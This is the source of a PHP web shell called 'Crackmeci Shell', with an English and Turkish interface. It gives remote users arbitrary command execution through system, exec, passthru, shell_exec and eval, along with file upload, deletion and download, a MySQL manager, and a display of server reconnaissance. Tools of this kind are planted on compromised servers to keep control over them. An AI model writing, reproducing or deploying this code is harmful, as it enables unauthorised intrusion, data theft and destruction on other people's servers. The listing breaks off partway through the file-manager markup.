<?php 
session_start();
$systemLang = isset($_SESSION["language"]) ? $_SESSION["language"] : "en";
$languages["en"] = [
    "about_button" => "About Me",
    "apache_text" => "Apache Version",
    "server_text" => "Server Info",
    "safe_modeText" => "Safe Mode",
    "apache_text" => "Apache Version",
    "groups" => "Groups",
    "server_ipText" => "Server IP",
    "your_ipText" => "Your IP",
    "navigation_homeText" => "Home",
    "navigation_uploadText" => "Upload",
    "navigation_phpInfoText" => "PHPInfo",
    "navigation_executeText" => "Execute",
    "navigation_sqlText" => "SQL Manager",
    "navigation_encryptText" => "Encrypt",
    "navigation_createLogin" => "Set Login",
    "fileManager_editPage_title" => "File Content",
    "fileManager_editPage_btnText" => "Update File!",
    "fileManager_title" => "File Manager",
    "fileManager_name" => "Name",
    "fileManager_size" => "Size",
    "fileManager_owner" => "Owner User-Group",
    "fileManager_permissions" => "Permissions",
    "fileManager_modified" => "Modified",
    "fileManager_actions" => "Actions",
    "uploadPage_title" => "Upload File",
    "uploadPage_btnText" => "Upload!",
    "executePage_btnText" => "Execute!",
    "sqlManager_title" => "SQL Connection",
    "sqlManager_hostHolder" => "Server Adress",
    "sqlManager_sqlUser" => "SQL Username",
    "sqlManager_sqlPassword" => "Password",
    "sqlManager_connectBtn" => "Connect!",
    "sqlManager_executeQuery" => "Write your sql query",
    "sqlManager_executeBtn" => "Execute Query",
    "encryptPage_title" => "Encrypt",
    "encryptPage_btnText" => "Encrypt!",
    "general_onText" => "ON",
    "general_offText" => "OFF",
    "aboutPage_mainText" => "This shell has been developed by Crackmeci.",
    "sql_notFound" => "No data found to display!",
    "file_notExists" => "File is not exists",
    "file_updateSuccess" => "File has updated with success",
    "file_uploaded" => "File has uploaded with success",
    "file_uploadedError" => "An error occurred while uploading the file",
    "fileManager_viewPage_title" => "View File",
    "command_errorText" => "An error occured while executing command!",
    "command_successText" => "Command has executed with success!",
    "encrypt_successText" => "Text encrypted with success!",
    "encrypt_errorText" => "An error occured while executing command!",
    "view_page_renameBtn" => "Rename!",
    "view_renameSuccessText" => "Renamed the file name with success!",    
    "view_renameErrorText" => "An error occured while renaming file!",
    "createLogin_pageTitle" => "Create Login",
    "createLogin_userHolder" => "Username",
    "createLogin_passHolder" => "Password",
    "createLogin_btnText" => "Create",
    "create_defaultText" => 'Bu işlemi ne yazık ki gerçekleştiremem çünkü $config değişkeninin user ve password anahtarları varsayılan değer olan {username} ve {password} değil ilk olarak onları varsayılan değerlerine sıfırlayınız!',
    "create_successText" => 'Hesap işlemi başarıyla gerçekleştirildi'
] ;

$languages["tr"] = [
    "about_button" => "Hakkımda",
    "apache_text" => "Apache Sürümü",
    "server_text" => "Sunucu Bilgisi",
    "safe_modeText" => "Güvenli Mod",
    "groups" => "Gruplar",
    "server_ipText" => "Sunucu IP",
    "your_ipText" => "IP Adresiniz",
    "navigation_homeText" => "Anasayfa",
    "navigation_uploadText" => "Yükle",
    "navigation_phpInfoText" => "PHP Bilgisi",
    "navigation_executeText" => "Çalıştır",
    "navigation_sqlText" => "SQL Yöneticisi",
    "navigation_encryptText" => "Şifrele",
    "navigation_createLogin" => "Giriş Ayarla",
    "fileManager_title" => "Dosya Yöneticisi",
    "fileManager_name" => "Ad",
    "fileManager_size" => "Boyut",
    "fileManager_owner" => "Sahip Kullanıcı-Grup",
    "fileManager_permissions" => "İzinler",
    "fileManager_modified" => "Değiştirilme Tarihi",
    "fileManager_actions" => "İşlemler",
    "fileManager_editPage_title" => "Dosya İçeriği",
    "fileManager_editPage_btnText" => "Dosyayı Güncelle!",
    "uploadPage_title" => "Dosya Yükleme",
    "uploadPage_btnText" => "Yükle!",
    "executePage_btnText" => "Çalıştır!",
    "sqlManager_title" => "SQL Bağlantısı",
    "sqlManager_hostHolder" => "Sunucu Adresi",
    "sqlManager_sqlUser" => "SQL Kullanıcı Adı",
    "sqlManager_sqlPassword" => "Şifre",
    "sqlManager_connectBtn" => "Bağlan!",
    "sqlManager_executeQuery" => "SQL sorgunuzu yazın",
    "sqlManager_executeBtn" => "Sorguyu Çalıştır",
    "encryptPage_title" => "Şifrele",
    "encryptPage_btnText" => "Şifrele!",
    "general_onText" => "AÇIK",
    "general_offText" => "KAPALI",
    "aboutPage_mainText" => "Bu webshell Crackmeci tarafından geliştirilmiştir",
    "sql_notFound" => "Görüntülenecek veri bulunamadı!",
    "file_notExists" => "Dosya Bulunamadı",
    "file_updateSuccess" => "Dosya başarıyla güncellendi!",
    "file_uploaded" => "Dosya başarıyla yüklendi",
    "file_uploadedError" => "Dosya yüklenirken bir hata oluştu",
    "fileManager_viewPage_title" => "Dosyayı Görüntüle",
    "command_errorText" => "Komut çalıştırılırken bir hata oluştu!",
    "command_successText" => "Komut başarıyla çalıştırıldı!",
    "encrypt_successText" => "Metin başarıyla şifrelendi!",
    "encrypt_errorText" => "Metin şifrelenirken bir hata oluştu!",
    "view_page_renameBtn" => "Yeniden Adlandır!",
    "view_renameSuccessText" => "Dosya başarıyla yeniden adlandırıldı!",    
    "view_renameErrorText" => "Dosya yeniden isimlendirilirken bir hata oluştu!"
];



?>

<?php
function get_perms($file)
{
    if ($mode = @fileperms($file)) {
        $perms = "";
        $perms .= $mode & 00400 ? "r" : "-";
        $perms .= $mode & 00200 ? "w" : "-";
        $perms .= $mode & 00100 ? "x" : "-";
        $perms .= $mode & 00040 ? "r" : "-";
        $perms .= $mode & 00020 ? "w" : "-";
        $perms .= $mode & 00010 ? "x" : "-";
        $perms .= $mode & 00004 ? "r" : "-";
        $perms .= $mode & 00002 ? "w" : "-";
        $perms .= $mode & 00001 ? "x" : "-";
        return $perms;
    } else {
        return "??????????";
    }
}

function downloadFile($filePath) {
    if (file_exists($filePath)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($filePath));
        readfile($filePath);
        exit;
    } else {
        echo "Dosya bulunamadı.";
    }
}
function getFileIcon($file) {
    $extension = pathinfo($file, PATHINFO_EXTENSION);
    switch ($extension) {
        case 'txt':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/text.png';        
        case 'html':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/html.png';
        case 'pdf':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/pdf.svg';
        case 'php':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/php.svg';
        case 'py':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/python.png';
        case 'rb':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/ruby.png';
        case 'pl':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/perl.png';
        case 'doc':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/word.png';
        case 'docx':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/word.png';
        case 'xlsx':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/excel.png';        
        case 'xlsm':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/excel.png';        
        case 'xlsb':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/excel.png';        
        case 'xltx':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/excel.png';        
        case 'xls':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/excel.png';        
        case 'ppt':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/powerpoint.png';        
        case 'pptx':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/powerpoint.png';        
        case 'sql':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/sql.png';
        case 'xml':
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/xml.png';
        default:
            return 'https://raw.githubusercontent.com/Crackmeci/shell/main/file.png';
    }
}

function formatFileSize($size) {
    if ($size >= 1024 * 1024 * 1024) {
        return number_format($size / (1024 * 1024 * 1024), 2) . " GB";
    } elseif ($size >= 1024 * 1024) {
        return number_format($size / (1024 * 1024), 2) . " MB";
    } elseif ($size >= 1024) {
        return number_format($size / 1024, 2) . " KB";
    } else {
        return $size . " Bytes";
    }
}

function scanningDir($dir){
    $scan = $dir;
    if(!is_dir($dir)){
        $scan = ".";
    }

    $tmp = [];
    $files = [];
    $directories = [];

    
    $alls = scandir($scan);
    
    foreach($alls as $one){
        $fullPath = realpath($scan . DIRECTORY_SEPARATOR . $one);

        if(is_file($fullPath)){
            array_push($files,$one);
        }else if(is_dir($fullPath) && $one != "." && $one != ".."){
            array_push($directories,$one);
        }
    }

    $tmp["files"] = $files;
    $tmp["directories"] = $directories;

    return $tmp;
}

function getOwnerGroup($path) {
    if(function_exists("posix_getpwuid")){
        return posix_getpwuid(fileowner($path))['name'] . " - " . posix_getgrgid(filegroup($path))['name'];
    }else{
        $owner = fileowner($path);
        $group = filegroup($path);
    
        $owner_name = fileowner($path);
        $group_name = filegroup($path);
    
        return $owner_name . " - " . $group_name;
    }
}

function createAndDownloadFolder($folderPath) {
    $targetFile = basename($folderPath);

    $phar = new PharData($targetFile . '.tar');
    $phar->buildFromDirectory($folderPath);

    $gzipped = gzopen($targetFile . '.tar.gz', 'w9');
    gzwrite($gzipped, file_get_contents($targetFile . '.tar'));
    gzclose($gzipped);

    unlink($targetFile . '.tar');
    
    header('Content-Type: application/x-gzip');
    header('Content-Disposition: attachment; filename="' . $targetFile . '.tar.gz"');

    readfile($targetFile . '.tar.gz');

    unlink($targetFile . '.tar.gz');
}

function simpleText($text)
{
    if (!get_magic_quotes_gpc()) {
        return $text;
    }
    return stripslashes($text);
}


function checkActive($href) {
    $currentUrl = $_SERVER["REQUEST_URI"];
    $tmp = 0;

    if (is_array($href)) {
        foreach ($href as $h) {
            if (stripos($currentUrl, $h) !== false) {
                $tmp++;
            }
        }

        if ($tmp > 0) {
            return true;  
        }
    } else {
        return stripos($currentUrl, $href) !== false;
    }

    return false; 
}


function useOne($arr){
    if(is_array($arr)){
        return $arr[0];
    }

    return $arr;
}


function executeCommand($cmd)
{
    $outputBuffer = "";

    if (function_exists("system")) {
        @ob_start();
        @system($cmd);
        $outputBuffer = @ob_get_contents();
        @ob_end_clean();
    } elseif (function_exists("exec")) {
        @exec($cmd, $results);
        $outputBuffer = implode("", $results);
    } elseif (function_exists("passthru")) {
        @ob_start();
        @passthru($cmd);
        $outputBuffer = @ob_get_contents();
        @ob_end_clean();
    } elseif (function_exists("shell_exec")) {
        $outputBuffer = @shell_exec($cmd);
    }else if(function_exists("eval")){
        $outputBuffer = @eval($cmd);
    }
    

    return $outputBuffer;
}

function createNavigation(){
    $dir = __DIR__;

    $parts = explode(DIRECTORY_SEPARATOR, $dir);

    $parts = array_filter($parts);

    return $parts;
}

function getPreviousAndImplode($arr,$index){
    if(count($arr) == 1) { return $arr[0]; }
    $tmp = [];
    $i = 0;
    foreach($arr as $part){
        $tmp[] = $part;
        if($i == $index){ break; }
        $i++;
    }

    return implode(DIRECTORY_SEPARATOR,$tmp);
}

class SQLManager {
    private $host;
    private $user;
    private $pass;
    private $db;
    private $charset;  // Added charset property

    public function __construct($host, $user, $pass, $charset = 'utf8') {
        $this->host = $host;
        $this->user = $user;
        $this->pass = $pass;
        $this->charset = $charset;
        $this->connect();
    }

    private function connect() {
        try {
            $dsn = "mysql:host={$this->host};charset={$this->charset};";  // Added charset to DSN
            $options = [
                PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
                PDO::ATTR_EMULATE_PREPARES   => false,
            ];

            $this->db = new PDO($dsn, $this->user, $this->pass, $options);
        } catch (PDOException $e) {
            die("Connection failed: " . $e->getMessage());
        }
    }

    public function disconnect() {
        $this->db = null;
    }

    public function query($sql, $params = []) {
        try {
            $stmt = $this->db->prepare($sql);
            $stmt->execute($params);
            return $stmt;
        } catch (PDOException $e) {
            die("Query failed: " . $e->getMessage());
        }
    }

    public function fetchAll($sql, $params = []) {
        $stmt = $this->query($sql, $params);
        return $stmt->fetchAll();
    }

    public function fetch($sql, $params = []) {
        $stmt = $this->query($sql, $params);
        return $stmt->fetch();
    }


    public function fetchColumns($tableName, $params = []) {
        $sql = "SELECT * FROM $tableName";
        $stmt = $this->query($sql, $params);
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    }

    public function showDatabases() {
        $sql = "SHOW DATABASES";
        $result = $this->fetchAll($sql);
        $databases = [];

        foreach ($result as $row) {
            $databases[] = $row['Database'];
        }

        return $databases;
    }

    public function showTables() {
        $sql = "SHOW TABLES";
        $result = $this->fetchAll($sql);
        $tables = [];

        foreach ($result as $row) {
            $tables[] = $row['Tables_in_' . $this->getCurrentDatabase()];  // Corrected column name
        }

        return $tables;
    }

    public function selectDatabase($database) {
        $this->disconnect(); // Close existing connection
        $this->connect();    // Reconnect to the specified database
        $this->db->exec("USE `$database`"); // Select the specified database
    }

    public function getCurrentDatabase() {
        $stmt = $this->query("SELECT DATABASE()");
        return $stmt->fetchColumn();
    }
}



function generateInputField($placeholder, $name, $iconClass, $type = "text")
{
    return '<div class="flex mt-2">
        <div class="prepend flex gap-2 bg-blue-500 min-w-[42px] items-center justify-center p-3">
            <i class="fa '.$iconClass.' text-lg text-white"></i>
        </div>
        <input class="p-2 w-full  border-none outline-none" type="'.$type.'" name="'.$name.'" placeholder="'.$placeholder.'" id="'.$name.'">
    </div>';
}


function appendDatabaseParam($url, $database) {
    $paramNameDatabase = 'database';
    $paramNameTable = 'table';
    $encodedDatabase = urlencode($database);

    $url = preg_replace("/[?&]{$paramNameDatabase}=[^&]*/", '', $url);
    $url = preg_replace("/[?&]{$paramNameTable}=[^&]*/", '', $url);

    if (!empty($database)) {
        $url .= (strpos($url, '?') === false) ? '?' : '&';
        $url .= "{$paramNameDatabase}={$encodedDatabase}";
    }

    return $url;
}


function appendTableParam($url, $table) {
    $paramName = 'table';
    $encodedTable = urlencode($table);

    if (strpos($url, "{$paramName}=") !== false) {
        $url = preg_replace("/{$paramName}=[^&]*/", "{$paramName}={$encodedTable}", $url);
    } else {
        $url .= (strpos($url, '?') === false) ? '?' : '&';
        $url .= "{$paramName}={$encodedTable}";
    }

    return $url;
}

function encryptText($text, $type) {
    switch ($type) {
        case 'rot13':
            return str_rot13($text);
        case 'base64':
            return base64_encode($text);
        case 'md5':
            return md5($text);
        case 'sha256':
            return hash('sha256', $text);
        case 'sha1':
            return sha1($text);
        case 'url':
            return urlencode($text);
        default:
            return "";
    }
}


function createPassword($userPassword) {
    $salt = bin2hex(random_bytes(16));
    $hashedPassword = hash('sha256', $salt . $userPassword);
    return array('password' => $hashedPassword, 'salt' => $salt);
}

function verifyPassword($userPassword, $storedPassword, $salt) {
    $hashedPassword = hash('sha256', $salt . $userPassword);
    return hash_equals($storedPassword, $hashedPassword);
}


?>


<?php 
    if(isset($_POST["execute"]) && isset($_GET["ajax"]) && $_POST["command"]){
        if($_POST["command"] == ""){
            $data["response"] = "An error occurred while executing command!";
            $data["type"] = "error";
        }else{
            $data["response"] = executeCommand(trim($_POST["command"]));
            $data["type"] = $data["response"] != "" ? "success" : "error";
        }

        echo json_encode($data);
        exit();
    }else if(isset($_POST["encrypt"]) && isset($_GET["ajax"]) && isset($_POST["type"]) && isset($_POST["text"])){
        if($_POST["type"] != "" && $_POST["text"] != ""){
            $data["response"] = encryptText(trim($_POST["text"]),trim($_POST["type"]));
            $data["type"] = $data["response"] != "" ? "success" : "error";
        }else{
            $data["response"] = "An error occurred while encrypting text!";
            $data["type"] = "error";
        }
        
        echo json_encode($data);
        exit();
    }
?>

<?php
    ob_start();

    try {
        $uid = posix_getuid();
        $gid = posix_getgid();
    } catch (Error $e) {
        $uid = getmyuid();
        $gid = getmygid();
    }

    try {
        if (function_exists('posix_getgroups')) {
            $groups = implode(',', posix_getgroups()); 
        } else {
            throw new Exception("posix_getgroups function is not available.");
    
            
        }
    } catch (Exception $e) {
        $groups = 0;
    }


    $config = [
        "user_ip" => $_SERVER["REMOTE_ADDR"],
        "server_ip" => gethostbyname($_SERVER["HTTP_HOST"]),
        "site_url" => "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"],
        "safe_mode" => @ini_get('safe_mode'),
        "mysql_status" => extension_loaded('mysql') || extension_loaded("mysqli") ? $languages[$systemLang]["general_onText"] : $languages[$systemLang]["general_offText"],
        "perl_status" => extension_loaded('perl') ? $languages[$systemLang]["general_onText"] : $languages[$systemLang]["general_offText"],
        "curl_status" => function_exists('curl_version') ? $languages[$systemLang]["general_onText"] : $languages[$systemLang]["general_offText"],
        "wget_status" => function_exists('shell_exec') && is_executable('/usr/bin/wget') ? $languages[$systemLang]["general_onText"] : $languages[$systemLang]["general_offText"],
        "apache_version" => function_exists('apache_get_version') ? apache_get_version() : "Server isn't apache",
        "server_info" =>  @php_uname(),
        "base_url" => basename(__FILE__),
    ];

    $navs = [
        [
            "name" => $languages[$systemLang]["navigation_homeText"],
            "href" => ["?page=home","?page=files"],
            "icon" => "fa fa-home",
            "code_name" => "home"
        ],
        [
            "name" => $languages[$systemLang]["navigation_uploadText"],
            "href" => "?page=upload",
            "icon" => "fas fa-cloud-upload-alt",
            "code_name" => "upload"
        ],
        [
            "name" => $languages[$systemLang]["navigation_phpInfoText"],
            "href" => "?page=phpinfo",
            "icon" => "fa-brands fa-php",
            "code_name" => "phpinfo"
        ],
        [
            "name" => $languages[$systemLang]["navigation_executeText"],
            "href" => "?page=execute",
            "icon" => "fa-solid fa-terminal",
            "code_name" => "execute"
        ],
        [
            "name" => $languages[$systemLang]["navigation_sqlText"],
            "href" => "?page=sqlManager",
            "icon" => "fa-solid fa-database",
            "code_name" => "sqlManager"
        ],

        [
            "name" => $languages[$systemLang]["navigation_encryptText"],
            "href" => "?page=encrypt",
            "icon" => "fa-solid fa-key",
            "code_name" => "encrypt"
        ],   
        
    ];

    $navStyles = [
        "active" => "p-2 text-white font-semibold bg-blue-500 min-w-[60px] text-center text-sm",
        "normal" => "p-2 text-white font-semibold border-[1px] border-[rgba(255,255,255,0.1)] text-sm min-w-[60px] text-center"
    ];

    if(!isset($_GET["page"])){
        $_GET["page"] = "home";
    }
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Crackmeci Shell</title>
    <meta name="description" content="Crackmeci Shell">
    <meta name="keywords" content="crackmeci shell, crackmeci, shell">
    <link rel="icon" type="image/png" href="https://github.com/Crackmeci/shell/blob/main/favicon.png?raw=true" sizes="32x32" />
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@100;300;400;500;600;700;800;900&display=swap');
        *{
            margin:0;
            padding:0;
            box-sizing:border-box;
            font-family:"Poppins",sans-serif;
        }

        .table-container {
            overflow-x: auto;
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        th, td {
            padding: 10px;
            text-align: left;
        }

        .aboutBtn{
            margin-top:4px;
        }

        #toggleMenu{
            margin-top:8px;
            display:none;
        }

        @media (max-width: 768px) {
            #toggleMenu{
                display:block;
            }

            .menu{
                display:none;
            }

            .headerBar{
                width:100%;
                display:block !important;
            }

            .aboutBtn{
                background-color:#111;
                margin-left:8px;
                padding:8px;
            }

            .subContainer{
                gap:16px;
                width:100%;
                display:flex;
            }

            .header .logo{
                margin-bottom:8px;
                border-bottom:1px solid rgba(255,255,255,0.1);
                padding: 2px;
                display:flex;
                justify-content:space-between;
                align-items:center;
                width:100%;
                border-right:0;
                flex:1;
            }

            .ipStatus{
                width: 50% !important;
            }

            .navbar{
                display:block !important;
            }

            .navbar li {
                margin-top:2px;
            }
        }
    </style>
</head>
<body class="w-full h-full bg-[#112]">
    <div class="container-fluid w-[95%] m-auto mt-6">
        <div class="header w-full bg-[#112] p-2">
            <div class="headerBar flex gap-4 border-b-[1px] border-[rgba(255,255,255,0.1)]">
                <div class="logo p-2 w-[25%] border-r-[1px] border-[rgba(255,255,255,0.1)]">
                    <h2 class="text-white text-3xl font-bold leading-2">Crackmeci Shell</h2>
                    <a href="?page=about"><span class="text-[#ccc] font-semibold  block aboutBtn"><?php echo $languages[$systemLang]["about_button"]; ?></span></a>
                </div>

                <div class="subContainer flex gap-4 w-full">
                    <div class="serverSettings p-2 w-[50%] border-r-[1px] border-[rgba(255,255,255,0.1)]">
                        <span class="text-[#ccc] text-xs block"><?php echo $languages[$systemLang]["apache_text"]; ?>: <?php echo $config["apache_version"]; ?></span>
                        <span class="text-[#ccc] text-xs block"><?php echo $languages[$systemLang]["server_text"]; ?>: <?php echo $config["server_info"]; ?></span>
                        <?php if($uid != 0 && $gid != 0 && $groups != 0): ?>
                            <span class="text-[#ccc] text-xs block"><?php echo "UID: $uid | GID: $gid | ".$languages[$systemLang]["groups"].": $groups\n"; ?></span>
                        <?php endif; ?>
                        <span class="text-[#ccc] text-xs block"> <?php echo $languages[$systemLang]["safe_modeText"]; ?>: <span class="<?php echo $config["safe_mode"] == 1 ? 'text-red-500' : 'text-green-500'; ?>"><?php echo $config["safe_mode"] == 1 ? $languages[$systemLang]["general_onText"] : $languages[$systemLang]["general_offText"]; ?></span></span>
                        <span class="text-[#ccc] text-xs block">
                            <p>
                                MySQL: <span class="<?php echo (strtoupper($config["mysql_status"]) == $languages[$systemLang]["general_onText"]) ? 'text-green-500' : 'text-red-500'; ?>"><?php echo $config["mysql_status"]; ?></span> |
                                Perl: <span class="<?php echo (strtoupper($config["perl_status"]) == $languages[$systemLang]["general_onText"]) ? 'text-green-500' : 'text-red-500'; ?>"><?php echo $config["perl_status"]; ?></span> |
                                cURL: <span class="<?php echo (strtoupper($config["curl_status"]) == $languages[$systemLang]["general_onText"]) ? 'text-green-500' : 'text-red-500'; ?>"><?php echo $config["curl_status"]; ?></span> |
                                WGet: <span class="<?php echo (strtoupper($config["wget_status"]) == $languages[$systemLang]["general_onText"]) ? 'text-green-500' : 'text-red-500'; ?>"><?php echo $config["wget_status"]; ?></span>
                            </p>
                        </span>
                        
                        <nav class="border-[1px] border-[rgba(255,255,255,0.1)] my-2 mr-2  flex items-center p-1">
                            <ul class="flex gap-2 list-style-none text-[#ccc] items-center flex-wrap">
                                <?php $navigation = createNavigation(); ?>
                                <?php $i=0;foreach($navigation as $currentNav): ?>
                                    <li class="flex items-center gap-2"><a class="text-[#ccc] text-sm hover:text-[#fff]" href="?folder=<?php echo getPreviousAndImplode($navigation,$i).DIRECTORY_SEPARATOR; ?>"><?php echo $currentNav; ?></a> <?php if($i != count($navigation) - 1) { echo ">"; } ?></li>
                                <?php $i++;endforeach; ?>
                            </ul>
                        </nav>
                    </div>

                    <div class="ipStatus p-2 w-[25%]">
                        <span class="text-[#ccc] font-bold hover:underline text-sm cursor-pointer block"><?php echo $languages[$systemLang]["server_ipText"]; ?>: <?php echo $config["server_ip"]; ?></span>
                        <span class="text-[#ccc] font-bold hover:underline text-sm cursor-pointer block"><?php echo $languages[$systemLang]["your_ipText"]; ?>: <?php echo $config["user_ip"]; ?></span>
                        <div class="flex p-2 border-[1px] border-[rgba(255,255,255,0.1)] flex items-center justify-center mt-4">
                            <?php 
                                if(isset($_POST["setLanguage"])){
                                    if($_POST["setLanguage"] == "tr"){
                                        $_SESSION["language"] = "tr";
                                    }else{
                                        $_SESSION["language"] = "en";
                                    }

                                    header("Refresh:0");
                                }
                            ?>
                            <form action="" method="post">
                                <button type="submit" name="setLanguage" value="tr" class="p-1">
                                    <svg class="w-[32px] h-[24px]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 800">
                                        <path fill="#E30A17" d="M0 0h1200v800H0z"/>
                                        <circle cx="425" cy="400" r="200" fill="#fff"/>
                                        <circle cx="475" cy="400" r="160" fill="#e30a17"/>
                                        <path fill="#fff" d="M583.334 400l180.901 58.779-111.804-153.885v190.212l111.804-153.885z"/>
                                    </svg>
                                </button>
                            </form>
                            <form action="" method="post">
                                <button type="submit" name="setLanguage" value="en" class="p-1">
                                    <svg class="w-[32px] h-[24px]" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" fill="#FFF" viewBox="0 0 1235 650">
                                        <path d="M0 0h1235v650H0"/>
                                        <path stroke="#b22234" stroke-dasharray="50" stroke-width="2470" d="M0 0v651"/>
                                        <path fill="#3c3b6e" d="M0 0h494v350H0"/>
                                        <g id="e">
                                            <g id="d">
                                                <g id="f">
                                                    <g id="c">
                                                        <g id="b">
                                                            <path id="a" d="m30 50.6 12-36 12 36-30.8-22H61"/>
                                                            <use xlink:href="#a" x="82"/>
                                                        </g>
                                                        <use xlink:href="#b" x="164"/>
                                                        <use xlink:href="#a" x="328"/>
                                                    </g>
                                                    <use xlink:href="#a" x="410"/>
                                                </g>
                                                <use xlink:href="#c" x="41" y="35"/>
                                            </g>
                                            <use xlink:href="#d" y="70"/>
                                        </g>
                                        <use xlink:href="#e" y="140"/>
                                        <use xlink:href="#f" y="280"/>
                                    </svg>
                                </button>
                            </form>

                        </div>

                    </div>
                </div>
            </div>
            
           
            <span id="toggleMenu" class="block px-2 w-full text-white font-bold text-xl text-center border-[1px] border-[rgba(255,255,255,0.1)] cursor-pointer"><i class="fa fa-bars"></i></span>
            <div class="menu mt-3">
                <nav class="border-[1px] border-[rgba(255,255,255,0.1)]">
                    <ul class="navbar flex gap-3 p-2 items-center flex-wrap">
                        <?php foreach($navs as $nav): ?>
                            <li class="<?php echo checkActive($nav["href"]) || $nav["code_name"] == $_GET["page"] ? $navStyles["active"] : $navStyles["normal"]; ?>"><a href="<?php echo useOne($nav["href"]); ?>"><?php if($nav["icon"] != 0): ?><i class="<?php echo $nav["icon"]; ?>"></i><?php endif; ?> <?php echo $nav["name"]; ?></a></li>
                        <?php endforeach; ?>
                    </ul>
                </nav>
            </div>

            <script>
                let menuBtn = document.querySelector("#toggleMenu");
                let menu = document.querySelector(".menu");

                menuBtn.addEventListener("click",()=>{
                    if(menu.style.display == ""){
                        menu.style.display = "block";
                    }else{
                        menu.style.display = "";
                    }
                })
            </script>
        </div>

        <?php if($_GET["page"] == "home" || $_GET["page"] == "files"): ?>
            <div class="container-fluid mx-auto">
                <h1 class="text-xl font-bold mb-4 mt-4 text-[#ccc] hover:text-white"><?php echo $languages[$systemLang]["fileManager_title"]; ?></h1>
                <?php $scanFolder = isset($_GET["folder"]) ? $_GET["folder"] : '.'; $all = scanningDir($scanFolder); ?>
                <?php 
                    if(isset($_POST["delete"])){
                        if($_POST["type"] == "file"){
                            $name = $_POST["name"];
                            @unlink($name);
                            header("Refresh:0");
                            exit();
                        }else if($_POST["type"] == "folder"){
                            $name = $_POST["name"];
                            @rmdir(rtrim($name, DIRECTORY_SEPARATOR));
                            header("Refresh:0");
                            exit();
                        }
                    }

                    if (isset($_POST["download"])) {
                        if($_POST["type"] == "file"){
                            $fileName = $_POST["name"];
                            downloadFile($fileName);
                        }else if($_POST["type"] == "folder"){
                            $folderName = $_POST["name"];
                            createAndDownloadFolder($folderName);
                        }
                    }
                ?>
                <table class="min-w-full bg-[#112] border-[1px] border-[rgba(255,255,255,0.1)]">
                    <thead>
                        <tr>
                            <th class="w-[300px] text-left py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] text-white font-bold"><?php echo $languages[$systemLang]["fileManager_name"]; ?></th>
                            <th class="py-2 px-4 text-left border-b-[1px] border-[rgba(255,255,255,0.1)] text-white font-bold"><?php echo $languages[$systemLang]["fileManager_size"]; ?></th>
                            <th class="py-2 px-4 text-left border-b-[1px] border-[rgba(255,255,255,0.1)] text-white font-bold"><?php echo $languages[$systemLang]["fileManager_owner"]; ?></th>
                            <th class="py-2 px-4 text-left border-b-[1px] border-[rgba(255,255,255,0.1)] text-white font-bold"><?php echo $languages[$systemLang]["fileManager_permissions"]; ?></th>
                            <th class="py-2 px-4  text-left border-b-[1px] border-[rgba(255,255,255,0.1)] text-white font-bold"><?php echo $languages[$systemLang]["fileManager_modified"]; ?></th>
                            <th class="py-2 px-4 text-left border-b-[1px] border-[rgba(255,255,255,0.1)] text-white font-bold"><?php echo $languages[$systemLang]["fileManager_actions"]; ?></th>
                        </tr>
                    </thead>

                    <tbody>
                        <tr>
                            <td class="py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] text-[#ccc] hover:text-white">
                                <a href="?folder=<?php echo !isset($_GET["folder"]) ? dirname(getcwd()) : dirname($_GET["folder"]); ?>">..</a>
                            </td>
                            <td class="border-b-[1px] border-[rgba(255,255,255,0.1)] " colspan="5"></td>
                        </tr>

                        <?php foreach($all["directories"] as $directory):
                            if($directory != "." && $directory != ".."):
                                $directoryPath = !isset($_GET["folder"]) ? "./" . $directory : $_GET["folder"].'/'.$directory; 
                        ?>

                        <tr>
                            <td class="py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] text-[#ccc] hover:text-white ">
                                <a class="cursor-pointer flex gap-2 hover:underline" href="?folder=<?php echo $directoryPath; ?>">
                                    <img class="w-[24px] h-[24px]" src="https://raw.githubusercontent.com/Crackmeci/shell/main/directory.png" alt="">
                                    <?php echo $directory; ?>
                                </a>
                            </td>

